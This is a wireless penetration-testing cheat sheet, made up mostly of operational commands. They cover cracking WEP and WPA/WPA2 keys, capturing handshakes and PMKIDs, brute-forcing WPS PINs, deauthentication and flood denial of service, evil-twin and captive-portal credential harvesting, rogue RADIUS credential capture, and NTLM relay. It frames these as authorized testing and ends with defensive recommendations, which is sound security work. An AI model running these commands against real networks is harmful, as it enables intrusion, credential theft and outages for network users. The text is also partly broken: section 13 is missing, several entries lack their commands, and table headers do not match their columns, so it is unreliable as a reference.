1. Wireless Fundamentals & Adapter Setup

Every engagement begins with an adapter that supports monitor mode and packet injection, tuned to the target’s channel.

1.1 Interfaces & Capabilities

# List wireless interfaces - Interface names and current modes
iw dev

# Detailed PHY capabilities - Confirm monitor mode + injection; note supported bands/channels
iw list

# Map interfaces to drivers - Shows the chipset/driver behind each interface
sudo airmon-ng

# Identify the driver - Useful when injection misbehaves
sudo ethtool -i wlan0

# List USB adapters - Confirm the dongle enumerated (e.g. RTL8812AU, MT7612U)
lsusb

# Unblock the radio - Clears soft/hard blocks before bringing the card up
sudo rfkill unblock wifi

1.2 Monitor Mode

Monitor mode lets the card capture every 802.11 frame, not just those addressed to it.

# Stop interfering processes - Frees the card from NetworkManager / wpa_supplicant
sudo airmon-ng check kill

# Start monitor mode - Creates a monitor interface such as wlan0mon
sudo airmon-ng start wlan0

# Verify the mode - The type field should read ‘monitor’
iw dev wlan0mon info

# Boost TX power (region-dependent) - Higher power can reach distant APs/clients
sudo iw dev wlan0mon set txpower fixed 3000

# Stop monitor mode - Restores managed mode when finished
sudo airmon-ng stop wlan0mon

Manual alternative when airmon-ng is unavailable:

sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

1.3 Channels, Bands & Regulatory

# Set the channel - Lock to the target before capturing
sudo iw dev wlan0mon set channel [channel]

# Set a 5 GHz channel + width - For 802.11n/ac networks
sudo iw dev wlan0mon set channel [channel] HT40+

# Set regulatory domain - Unlocks region-specific channels and TX power
sudo iw reg set US

# Show the current domain - Confirms which channels/power are permitted
iw reg get

# List allowed frequencies - Which channels the card may actually use
iw list | grep -A1 Frequencies

1.4 MAC Spoofing

# Randomize the MAC - Bring the interface down first
sudo macchanger -r wlan0

# Set a specific MAC - Impersonate an allow-listed client
sudo macchanger -m [mac] wlan0

# Restore the hardware MAC - Revert to the burned-in address
sudo macchanger -p wlan0

1.5 Troubleshooting

# Injection fails - Move closer or swap to an injection-capable adapter
sudo aireplay-ng --test wlan0mon

# ‘fixed channel -1’ error - A process is hopping the card; pin the channel
sudo iwconfig wlan0mon channel [channel]

# Card keeps getting grabbed - NetworkManager / wpa_supplicant re-claimed it
sudo airmon-ng check kill
  • Handshake never validates — Re-deauth and recapture — all four EAPOL messages must be present.

2. Wireless Security Protocols

Understanding the mechanism tells you exactly what to capture and where it breaks.

2.1 At a Glance

DescriptionCommandNotes on Methodology
WEP RC4 with a 24-bit IV IV reuse leaks the key — crackable in minutes
WPA/WPA2-PSK 4-way handshake, PBKDF2(passphrase, ESSID) Offline dictionary attack on a captured handshake / PMKID
WPA3-Personal SAE / Dragonfly + mandatory PMF Resists offline dictionary attacks; watch transition mode
WPA-Enterprise 802.1X / EAP to a RADIUS server Rogue-AP theft of the inner MSCHAPv2 credentials

2.2 The WPA 4-Way Handshake

The PSK and ESSID derive the PMK via PBKDF2; the four EAPOL messages then exchange the ANonce and SNonce used to build the PTK, and message 2 carries a MIC. Cracking replays candidate passphrases through the same derivation until the computed MIC matches the captured one — so a full, clean handshake (M1–M4) plus the ESSID is all that’s needed offline.

2.3 PMKID (Clientless)

Many APs place a PMKID in the first EAPOL frame, computed as HMAC-SHA1(PMK, "PMK Name" | AP_MAC | STA_MAC). Because it depends only on the PMK, it can be cracked exactly like a handshake — and captured without any client connected.

2.4 Bands & Channels

DescriptionCommandNotes on Methodology
2.4 GHz Channels 1–14; 1/6/11 non-overlapping Longer range, more congestion
5 GHz Many channels, some under DFS Shorter range, less noise, more throughput
Protected Mgmt Frames (802.11w) PMF / MFP Blocks classic deauth; mandatory under WPA3

3. Reconnaissance & Discovery

Map the airspace before attacking: enumerate APs, encryption, channels, and the clients on each.

3.1 Scanning the Airspace

# Sweep all networks - Channel-hops and lists APs and clients
sudo airodump-ng wlan0mon

# 2.4 GHz / 5 GHz only - Use --band a for 5 GHz
sudo airodump-ng --band bg wlan0mon

# Filter by encryption - Show only matching networks
sudo airodump-ng --encrypt WPA2 wlan0mon

# Show WPS info - Flags WPS state alongside each AP
sudo airodump-ng --wps wlan0mon

# Show manufacturers - Adds vendor column from the OUI
sudo airodump-ng --manufacturer wlan0mon

# Save the scan - Keep evidence and parse later
sudo airodump-ng -w scan --output-format pcap,csv wlan0mon

3.2 Targeting an Access Point

# Focus on one AP - Locks the channel and writes capture*.cap
sudo airodump-ng --bssid [bssid] -c [channel] -w capture wlan0mon

# Read signal strength - Values closer to 0 are stronger / nearer
airodump-ng PWR column

# Lock to a band + channel - Avoids hopping away from the target
sudo airodump-ng --band a -c [channel] wlan0mon

3.3 Hidden Networks

Cloaked SSIDs are blank until a client (re)associates.

# Spot a hidden ESSID - A length placeholder marks a cloaked SSID
airodump-ng (<length: N>)

# Force it to reveal - The name appears when the client reconnects
sudo aireplay-ng --deauth 5 -a [bssid] -c [client] wlan0mon

3.4 Clients & Probe Requests

# List associated stations - Client MACs tied to each BSSID
airodump-ng STATION column

# Read probe requests - Networks a client is searching for — feeds Karma attacks
airodump-ng Probes column

3.5 Alternative Scanners

# Kismet - Rich GUI/CLI sniffer with logging and device tracking
sudo kismet -c wlan0mon

# iw scan (managed) - Quick managed-mode scan
sudo iw wlan0 scan | grep SSID

# WPS scan - Lists WPS-enabled APs and lock state
wash -i wlan0mon

3.6 Wardriving (GPS)

# Start gpsd - Feed location data to the sniffer
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock

# Kismet with GPS - Logs APs with coordinates for mapping
sudo kismet -c wlan0mon

# airodump with GPS - Tags captures with GPS fixes
sudo airodump-ng --gpsd -w wardrive wlan0mon

4. Connecting to Networks

Once you recover a key you have to actually join the network — the config differs per encryption type.

4.1 Open & WEP

# Open
sudo iw wlan0 connect [essid]

# WEP (hex key)
sudo iw wlan0 connect [essid] key 0:[hexkey]
sudo dhclient wlan0

4.2 WPA / WPA2 / WPA3

wpa_passphrase [essid] '[password]' > wifi.conf
sudo wpa_supplicant -B -i wlan0 -c wifi.conf
sudo dhclient wlan0

# hidden network: add scan_ssid=1 to the network block

Or via NetworkManager: nmcli dev wifi connect [essid] password '[password]'

4.3 WPA Enterprise

network={
  ssid="[essid]"
  key_mgmt=WPA-EAP
  eap=PEAP
  identity="[user]"
  password="[password]"
  phase2="auth=MSCHAPV2"
}

5. Capturing Handshakes & PMKID

WPA/WPA2 recovery is offline, so the on-site goal is simply a valid 4-way handshake or a PMKID.

5.1 4-Way Handshake

# Capture on the target - Watch the header for ‘WPA handshake’
sudo airodump-ng --bssid [bssid] -c [channel] -w handshake wlan0mon

# Confirm the capture - Should report a handshake for the BSSID
aircrack-ng handshake-01.cap

5.2 Forcing a Handshake

# Deauth one client - Targeted — quieter and reliable
sudo aireplay-ng --deauth 10 -a [bssid] -c [client] wlan0mon

# Broadcast deauth - Hits every client (noisier)
sudo aireplay-ng --deauth 10 -a [bssid] wlan0mon

# Deauth with mdk4 - Aggressive alternative deauther
sudo mdk4 wlan0mon d -B [bssid]

5.3 PMKID (Clientless)

# Capture the PMKID - Pulls the PMKID straight from the AP
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1

# Target one BSSID - Focus the capture
sudo hcxdumptool -i wlan0mon -w p.pcapng --filterlist_ap=[bssid] --filtermode=2

# Convert for cracking - Produces the mode-22000 hash
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

5.4 Verifying & Cleaning Captures

# Strip to one handshake - Removes noise the crackers dislike
wpaclean clean.cap handshake-01.cap

# Inspect EAPOL frames - Confirm all four messages were captured
tshark -r handshake-01.cap -Y eapol

5.5 Automated Capture

# besside-ng - Auto-deauths clients and grabs handshakes / WEP material
sudo besside-ng -b [bssid] wlan0mon

6. WEP

WEP is broken by design: gather enough initialization vectors (IVs) and the key falls out statistically.

6.1 With Connected Clients

ARP replay floods IVs quickly when a client is active.

sudo aireplay-ng --fakeauth 0 -a [bssid] -h [your_mac] wlan0mon
sudo aireplay-ng --arpreplay -b [bssid] -h [your_mac] wlan0mon
# Interactive packet replay - Hand-pick a frame to replay when ARP is scarce
sudo aireplay-ng --interactive -b [bssid] -h [your_mac] wlan0mon

6.2 Without Clients

Recover a keystream and forge your own traffic when no client is present.

# Fake authentication - Associate to the AP yourself
sudo aireplay-ng --fakeauth 0 -a [bssid] -h [your_mac] wlan0mon

# Fragmentation attack - Recovers a PRGA keystream
sudo aireplay-ng --fragment -b [bssid] -h [your_mac] wlan0mon

# ChopChop attack - Alternative keystream recovery
sudo aireplay-ng --chopchop -b [bssid] -h [your_mac] wlan0mon

Forge and inject an ARP packet from the recovered keystream, then crack:

packetforge-ng --arp -a [bssid] -h [your_mac] \
  -k 255.255.255.255 -l 255.255.255.255 -y keystream.xor -w arp.cap
sudo aireplay-ng --interactive -r arp.cap wlan0mon

6.3 Client-Side Attacks (Caffe-Latte & Hirte)

Attack an isolated client away from its home AP by replaying its own traffic.

# Serve a lure AP - Fake WEP AP with Caffe-Latte (-L) and Hirte (-N)
sudo airbase-ng -c [channel] -e [essid] -W 1 -L -N wlan0mon

# Caffe-Latte - Targets a roaming client with no real AP present
sudo aireplay-ng --caffe-latte -b [bssid] wlan0mon

# Hirte (fragmented) - Variant effective against more clients
sudo aireplay-ng --cfrag -h [client_mac] wlan0mon

6.4 Cracking the Key

# PTW attack (default) - Fast statistical crack; needs ~20k–80k IVs
aircrack-ng -b [bssid] wep-01.cap

# KoreK attack - Older method; useful when PTW stalls
aircrack-ng -K -b [bssid] wep-01.cap

6.5 Automated WEP

# wesside-ng - Automates fake-auth, injection, and key recovery
sudo wesside-ng -i wlan0mon -v [bssid]

# easside-ng - Clientless WEP without recovering the key
sudo easside-ng -i wlan0mon -a [your_mac] -v [bssid]

7. WPA / WPA2 (PSK)

With a handshake or PMKID, recovery is a pure offline dictionary / brute-force problem.

7.1 Cracking with aircrack-ng

# Dictionary attack - CPU-based crack of the handshake
aircrack-ng -w [wordlist] -b [bssid] handshake-01.cap

# Pipe a generator - Stream candidates without storing them
crunch 8 8 -t @@@@@@@@ | aircrack-ng -w - -b [bssid] handshake-01.cap

7.2 Cracking with hashcat

hashcat is far faster on a GPU and handles handshakes and PMKID with one mode.

# Convert the capture - Turns a .cap into mode 22000
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Straight dictionary - Fast GPU crack
hashcat -m 22000 hash.hc22000 [wordlist]

# Rule-based attack - Mutates each candidate
hashcat -m 22000 hash.hc22000 [wordlist] -r /usr/share/hashcat/rules/best64.rule

# Mask / brute force - Effective on PIN-style passphrases
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Incremental mask - Grows length automatically
hashcat -m 22000 hash.hc22000 -a 3 --increment ?a?a?a?a?a?a?a?a

# Show cracked - Re-display recovered keys
hashcat -m 22000 hash.hc22000 --show

7.3 AP-less Capture

When the real AP is out of range, a rogue AP can elicit usable material from a probing client.

# Advertise the ESSID - Offer WPA2-CCMP so the client begins a handshake
sudo airbase-ng -c [channel] -e [essid] -Z 4 wlan0mon

# Clientless via PMKID - Usually the simplest AP-less route
sudo hcxdumptool -i wlan0mon -w apless.pcapng --enable_status=1

7.4 Precomputed PMK (Rainbow Tables)

For a fixed ESSID, pre-hash a wordlist once and reuse it across captures.

# Build a PMK database - Precompute PMKs for the ESSID
airolib-ng db --import essid essid.txt && airolib-ng db --import passwd [wordlist] && airolib-ng db --batch

# Crack with the database - Reuses the precomputed PMKs
aircrack-ng -r db handshake-01.cap

# genpmk + cowpatty - Alternative precomputed workflow
genpmk -f [wordlist] -d pmkhash -s [essid] && cowpatty -d pmkhash -r handshake-01.cap -s [essid]

7.5 Automation

# wifite - Automates capture + crack across nearby targets
sudo wifite --kill

8. WPS

If WPS is enabled, the 8-digit PIN is often a faster route to the PSK than cracking the handshake.

8.1 Discovery

# Find WPS access points - Lists BSSID, WPS version, and lock state
wash -i wlan0mon

8.2 Pixie-Dust (Offline)

Exploits weak randomness in many WPS implementations — near-instant when vulnerable.

# Reaver Pixie-Dust - Offline PIN recovery
reaver -i wlan0mon -b [bssid] -c [channel] -K 1 -vv

# pixiewps (standalone) - Compute the PIN from captured WPS values
pixiewps -e [pke] -r [pkr] -s [ehash1] -z [ehash2] -a [authkey] -n [enonce]

# Bully alternative - Second implementation to try
bully wlan0mon -b [bssid] -c [channel] -d -v 3

8.3 Online PIN Brute Force

# Brute force the PIN - Slow; tune delays to dodge lockouts
reaver -i wlan0mon -b [bssid] -c [channel] -vv -N -d 15 -T 5

# Try the null PIN - Some APs accept an empty PIN
reaver -i wlan0mon -b [bssid] -c [channel] -p ''

8.4 Recover the PSK

A valid PIN makes the AP hand back the WPA passphrase, which Reaver/Bully print on success — no handshake cracking required.

9. WPA3 (SAE)

WPA3 replaces the crackable PSK handshake with SAE (Dragonfly), so offline dictionary attacks no longer apply — look for transition-mode fallback.

9.1 Identifying WPA3 & PMF

# Check the AKM - The AUTH column shows SAE for WPA3
sudo airodump-ng --bssid [bssid] -c [channel] wlan0mon

# Note PMF - Mandatory PMF blocks classic deauth on WPA3-only nets
(MFP required)

9.2 Transition-Mode Downgrade

WPA2/WPA3 transition networks still accept WPA2, leaving a crackable path.

# Capture the WPA2 path - Crack the fallback handshake / PMKID
sudo hcxdumptool -i wlan0mon -w transition.pcapng --enable_status=1

9.3 Dragonblood (Awareness)

The Dragonblood research showed side-channel and downgrade weaknesses in early SAE implementations. Pure, patched WPA3-SAE resists offline dictionary attacks — focus your effort on transition mode, misconfiguration, and the client side.

10. WPA Enterprise (802.1X)

Enterprise networks authenticate users via EAP, not a shared key, so the attack is a rogue AP that captures the inner credentials.

10.1 Reconnaissance

  • Identify the EAP method — Observe the client’s EAP-Response to determine the method: PEAP / EAP-TTLS / EAP-TLS / EAP-GTC / EAP-MD5.
  • Read the server cert — Inspect the RADIUS cert in the capture — domain / email hints help craft a convincing rogue cert.

10.2 Rogue AP with EAPHammer

One-time setup, then launch a credential-stealing AP:

./eaphammer --cert-wizard
sudo ./eaphammer -i wlan0 --essid [essid] --auth wpa-eap --creds

10.3 hostapd-wpe

The classic enterprise-attack AP — impersonates the RADIUS server and logs the inner credentials.

# Generate server certs - One-time certificate setup
cd /etc/hostapd-wpe/certs && sudo ./bootstrap

# Launch the rogue RADIUS AP - Logs usernames and the MSCHAPv2 challenge/response
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

10.4 EAP Methods

DescriptionCommandNotes on Methodology
EAP-TLS client + server certificates Strongest; no password to steal — need a client cert
EAP-TTLS / PEAP TLS tunnel around MSCHAPv2 Most common — rogue AP captures the inner MSCHAPv2
EAP-GTC plaintext token in the tunnel A GTC downgrade can yield the cleartext password
EAP-MD5 challenge/response, no server auth Trivially captured and cracked; rare today

10.5 Config & Certificates

Key bits of a rogue RADIUS config and an EAP-TLS client.

# hostapd-wpe.conf (essentials)
interface=wlan0
ssid=[essid]
channel=[channel]
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=./certs/ca.pem
server_cert=./certs/server.pem
private_key=./certs/server.key
# EAP-TLS client (wpa_supplicant)
network={
  ssid="[essid]"
  key_mgmt=WPA-EAP
  eap=TLS
  identity="[user]"
  ca_cert="/path/ca.pem"
  client_cert="/path/client.pem"
  private_key="/path/client.key"
  private_key_passwd="[pass]"
}

10.6 Cracking & Relay

# Crack MSCHAPv2 (hashcat) - Recovers the account password
hashcat -m 5500 [netntlm_hash] [wordlist]

# Crack with asleap - Classic challenge/response cracker
asleap -r capture.dump -f [dict]

# Relay the credentials - Relay captured NTLM where signing permits
ntlmrelayx (downstream)

11. Rogue Access Points & Evil Twin

A look-alike AP lures clients for credential capture or man-in-the-middle.

11.1 Soft AP

# Create a fake AP - Brings up the at0 interface
sudo airbase-ng -e [essid] -c [channel] wlan0mon

# WPA2 rogue - Advertise WPA2 to coax a handshake
sudo airbase-ng -e [essid] -c [channel] -Z 4 wlan0mon

11.2 Karma / Known Beacons

# Answer probed networks - Responds to clients’ saved-network probes
sudo ./eaphammer -i wlan0 --essid [essid] --known-beacons

# MANA loud mode - Replies to every probe to attract clients
hostapd-mana (loud=1)

11.3 Captive Portal

# wifiphisher - Automated evil-twin plus a credential page
sudo wifiphisher

# eaphammer portal - Built-in hostile captive portal
sudo ./eaphammer -i wlan0 --essid [essid] --captive-portal

11.4 All-in-One Frameworks

# airgeddon - Menu-driven wrapper for capture, evil-twin, WPS, and cracking
sudo airgeddon

# Fluxion - Evil-twin + captive-portal social-engineering attack
sudo ./fluxion.sh

# WiFi-Pumpkin3 - Rogue-AP framework with proxies and plugins
sudo wifipumpkin3

# bettercap (wifi) - wifi.recon / wifi.deauth / handshake-capture module
sudo bettercap -iface wlan0mon

A hand-built captive portal: rogue AP plus DHCP/DNS redirect.

# dnsmasq.conf

12. Denial of Service

Disruptive techniques — only ever in scope and with written authorization, as they affect availability.

12.1 Deauthentication Flood

# Targeted deauth flood - 0 = continuous; knocks a client offline
sudo aireplay-ng --deauth 0 -a [bssid] -c [client] wlan0mon

# mdk4 deauth - Aggressive multi-client deauth
sudo mdk4 wlan0mon d -B [bssid]

12.2 Beacon & Auth Floods

# Beacon flood - Spams fake APs to confuse clients
sudo mdk4 wlan0mon b -n [essid]

# Authentication DoS - Floods the AP with bogus auth requests
sudo mdk4 wlan0mon a -a [bssid]

12.3 mdk4 Modes

# d — Deauth / Disassoc - Knock clients off a target
sudo mdk4 wlan0mon d -B [bssid]

# b — Beacon flood - Flood fake beacons
sudo mdk4 wlan0mon b -n [essid]

# a — Auth DoS - Exhaust the AP’s client table
sudo mdk4 wlan0mon a -a [bssid]

# p — Probe / SSID - Probe and brute hidden SSIDs
sudo mdk4 wlan0mon p -t [bssid]

# m — Michael (TKIP) DoS - Trigger TKIP countermeasures
sudo mdk4 wlan0mon m -t [bssid]

Reference for the offline cracking step, whatever capture you started from.

14.1 Wordlists

# Default list - gunzip it before first use

# Generate a keyspace - Build a custom list on the fly
crunch [min] [max] [charset]

# Site-specific words - Scrape a wordlist from the org’s site

# Keyboard-walk lists - Generate walk-the-keyboard candidates

# Crack with John - Alternative cracker to hashcat

15. Post-Access & Traffic Analysis

After recovering a key, connect to validate access and decrypt the captured traffic for evidence.

15.1 Decryption

# Decrypt WPA traffic - Outputs a decrypted .cap
airdecap-ng -e [essid] -p [password] capture-01.cap

# Decrypt WEP traffic - Uses the recovered WEP key
airdecap-ng -w [hexkey] capture-01.cap

15.2 Inspection

# Open in Wireshark - Filter on eapol or wlan.fc.type_subtype
wireshark capture-01-dec.cap

# CLI frame filtering - Quickly locate handshakes / management frames
tshark -r capture-01.cap -Y eapol

# Management frames - Beacons, probes, (de)auth, assoc
tshark -r capture.cap -Y 'wlan.fc.type==0'

# Raw capture - Capture outside the aircrack toolchain
sudo tcpdump -i wlan0mon -w raw.pcap

16. Methodology

16.1 Pre-Engagement & Setup

  • Confirm scope: in-scope ESSIDs/BSSIDs, whether deauth and DoS are permitted, and the testing window
  • Verify the adapter does monitor mode and passes an injection test; keep a spare on hand
  • Set the regulatory domain, sync the clock, stage wordlists, and ensure disk space for captures
  • Record the starting state (interface name, MAC) so you can restore it cleanly afterward

16.2 Reconnaissance

  • Kill interfering processes and enable monitor mode
  • Sweep 2.4 GHz and 5 GHz; log every in-scope AP (BSSID, ESSID, channel, encryption, cipher, WPS, PWR)
  • Enumerate the clients on each AP and note their probe requests
  • Reveal any hidden ESSIDs by deauthing an associated client
  • Classify each target by encryption (WEP / WPA2 / WPA3 / Enterprise) to choose the attack path

16.3 Target Selection

  • Prioritize targets by encryption weakness and signal strength
  • Lock the card to the target channel and start a scoped capture to file

16.4 WEP Path

  • With clients present: fake-auth, then ARP-replay to flood IVs
  • Without clients: fragmentation or chopchop to recover a keystream, then packetforge + inject
  • Isolated client only: Caffe-Latte / Hirte against the roaming client
  • Collect enough IVs and crack with PTW (fall back to KoreK if it stalls)

16.5 WPA / WPA2-PSK Path

  • Capture the 4-way handshake (deauth a client) or grab the PMKID clientlessly
  • Verify all four EAPOL messages, clean the capture (wpaclean), and convert to hc22000
  • Crack offline: dictionary first, then rules and masks (aircrack-ng / hashcat)
  • If WPS is enabled: Pixie-Dust first, then a rate-limited PIN brute force; recover the PSK
  • If the AP is out of range, fall back to an AP-less / PMKID approach

16.6 WPA3 Path

  • Confirm SAE and that mandatory PMF blocks classic deauth
  • Look for WPA2/WPA3 transition mode and attack the crackable WPA2 fallback
  • Against pure SAE, pivot to misconfiguration and the client side — offline dictionary attacks will not work

16.7 WPA-Enterprise Path

  • Recon the EAP method, the RADIUS server certificate, and the user/domain naming
  • Stand up a rogue AP (EAPHammer / hostapd-wpe) with a convincing certificate
  • Capture the inner MSCHAPv2 challenge/response from a connecting client
  • Crack it (hashcat -m 5500 / asleap), or relay the credentials where signing allows

16.8 Rogue AP / Evil Twin

  • Where in scope, lure clients with Karma / known-beacons or a targeted evil twin
  • Use a captive portal to harvest credentials if that is an objective

16.9 Post-Exploitation

  • Connect with the recovered key (wpa_supplicant) and confirm access
  • Pull a DHCP lease and perform light internal recon — only if it is in scope
  • Decrypt the captured traffic (airdecap-ng) and inspect it (Wireshark / tshark)

16.10 Reporting & Cleanup

  • Record each finding: AP, encryption, method, time-to-crack, and evidence (capture files, cracked keys, screenshots)
  • Note defensive recommendations: WPA3 + PMF, a long/random PSK, disable WPS, EAP-TLS for enterprise
  • Restore the adapter to managed mode, tear down any rogue APs, and clean up artifacts
